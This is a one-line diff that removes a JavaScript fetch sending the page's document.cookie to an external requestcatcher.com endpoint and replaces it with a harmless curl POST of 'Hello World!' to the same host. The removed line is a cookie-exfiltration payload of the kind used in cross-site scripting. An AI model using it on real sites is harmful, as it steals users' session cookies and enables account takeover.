@@ -1,1 +1,1 @@
-fetch("https://ceva.requestcatcher.com/test" + document.cookie)
+curl -X POST -d 'Hello World!' https://ceva.requestcatcher.com/test 
